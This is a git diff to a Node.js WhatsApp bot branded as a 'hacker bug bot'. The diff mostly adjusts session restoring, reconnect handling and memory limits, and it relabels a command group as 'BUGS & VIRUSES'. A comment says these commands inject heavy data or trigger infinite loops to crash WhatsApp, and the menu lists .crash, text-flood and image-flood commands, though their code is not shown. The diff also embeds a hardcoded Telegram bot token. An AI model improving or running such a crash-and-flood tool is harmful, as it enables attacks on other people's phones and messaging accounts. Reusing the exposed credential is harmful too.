@@ -27,7 +27,7 @@ http.createServer((req, res) => {
 process.on('uncaughtException', (err) => console.log('[-] Caught Exception:', err.message));
 process.on('unhandledRejection', (err) => console.log('[-] Unhandled Rejection:', err));
 
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8337876876:AAGxjUJyBH2EIPfm1z6m_l4IKNbSg1X_eew";
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8337876876:AAGxjUJyBH2EIPfm1z6m_l4IKNbSg1X_eew"; 
 const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 const OWNER_NAME = "N̰A̰W̰A̰B̰ Z̰A̰D̰A̰ H̰A̰C̰K̰ḚR̰✌̰️̰🦅̰";
 const BOT_NAME = "𝗡𝗔𝗪𝗔𝗕 𝗭𝗔𝗗𝗔 𝗛𝗔𝗖𝗞𝗘𝗥 𝗕𝗨𝗚 𝗕𝗢𝗧";
@@ -63,14 +63,17 @@ console.log(`[+] ${BOT_NAME} 24/7 Active...`);
 async function restoreAllSessions() {
     try {
         const sessionsDir = path.join(__dirname, 'sessions');
+        // Limit concurrent restores to prevent Railway Crash
         const folders = fs.readdirSync(sessionsDir);
-        for (let folder of folders) {
+        for (let i = 0; i < folders.length; i++) {
+            const folder = folders[i];
             const fullPath = path.join(sessionsDir, folder);
             if (fs.existsSync(path.join(fullPath, 'creds.json'))) {
                 const sessionKey = folder.replace('session_', '');
                 console.log(`[+] Restoring Active Session: ${sessionKey}`);
                 startSocketEngine(fullPath, sessionKey);
-                await delay(2500);
+                // Small delay between restores to save memory
+                if (i % 2 === 0) await delay(1500); 
             }
         }
     } catch (e) {}
@@ -79,6 +82,7 @@ setTimeout(restoreAllSessions, 3000);
 
 // ==================== ROBUST MULTI-DEVICE SOCKET ENGINE ====================
 async function startSocketEngine(sessionDir, sessionKey, onReady) {
+    // Close existing if any
     if (activeSessions[sessionKey]) {
         try {
             activeSessions[sessionKey].ws?.close();
@@ -131,10 +135,13 @@ async function startSocketEngine(sessionDir, sessionKey, onReady) {
                 if (onReady) onReady(sock);
             } else if (connection === 'close') {
                 if (heartbeatTimer) clearInterval(heartbeatTimer);
+                
+                // FIX: Correct statusCode extraction to prevent loop crash
                 const statusCode = lastDisconnect?.error?.output?.statusCode;
                 console.log(`Session [${sessionKey}] Closed (Code: ${statusCode}). Auto-Reconnecting...`);
 
-                if (.statusCode !== DisconnectReason.loggedOut) {
+                // Check if it was logged out or other error
+                if (statusCode !== DisconnectReason.loggedOut) {
                     setTimeout(() => startSocketEngine(sessionDir, sessionKey, onReady), 2500);
                 } else {
                     console.log(`Session [${sessionKey}] Logged Out.`);
@@ -253,7 +260,7 @@ function setupWhatsAppEvents(sock) {
     if (sock._eventsLoaded) return;
     sock._eventsLoaded = true;
 
-    // FIX: PREVENT DUPLICATES
+    // FIX: PREVENT DUPLICATES & MEMORY LEAK
     sock.ev.on('messages.upsert', async ({ messages }) => {
         const m = messages[0];
         if (!m || !m.message) return;
@@ -269,6 +276,8 @@ function setupWhatsAppEvents(sock) {
         const msgId = m.key.id;
         if (processedMsgIds.has(msgId)) return;
         processedMsgIds.add(msgId);
+        
+        // FIX: Limit Set Size to prevent Memory Leak on Railway
         if (processedMsgIds.size > 3000) {
             const first = processedMsgIds.values().next().value;
             processedMsgIds.delete(first);
@@ -413,7 +422,7 @@ function setupWhatsAppEvents(sock) {
             } catch (e) { return reply("❌ Admin rights needed."); }
         }
 
-        // ==================== 3. POWERFUL BUGS (20+ COMMANDS) ====================
+        // ==================== 3. POWERFUL BUGS & VIRUSES (20+ COMMANDS) ====================
         // These commands inject heavy data or trigger infinite loops to crash WhatsApp
         
         if (cmd === '.crash') {
@@ -524,7 +533,7 @@ function setupWhatsAppEvents(sock) {
                              `╭─── ❖ *👑 OWNER COMMANDS* ❖\n` +
                              `│ ✦ 1. .owner\n` +
                              `│ ✦ 2. .ping / .speed\n` +
-                             `│ ✦ 3. .status / .alive\n` +
+                             `│ ✦ 3. .status / ..alive\n` +
                              `│ ✦ 4. .restart / .re\n` +
                              `│ ✦ 5. .shutdown\n` +
                              `│ ✦ 6. .privatemode on/off\n` +
@@ -538,12 +547,12 @@ function setupWhatsAppEvents(sock) {
                              `│ ✦ 3. .kick / .ban\n` +
                              `│ ✦ 4. .promote / .admin\n` +
                              `│ ✦ 5. .demote\n` +
-                             `│ ✦ 6. .close / .lock\n` +
+                             `│ ✦ 6. .close / ..lock\n` +
                              `│ ✦ 7. .open / .unlock\n` +
                              `│ ✦ 8. .setname\n` +
                              `│ ✦ 9. .gclink / .link\n` +
                              `╰───────────────────────────\n\n` +
-                             `╭─── ❖ *💥  BUGS* 💥\n` +
+                             `╭─── ❖ *💥 WORLD'S #1 BUGS* 💥\n` +
                              `│ ✦ 1. .crash (Global Crash)\n` +
                              `│ ✦ 2. .bug1 (Text Flood)\n` +
                              `│ ✦ 3. .bug2 (Image Flood)\n` +
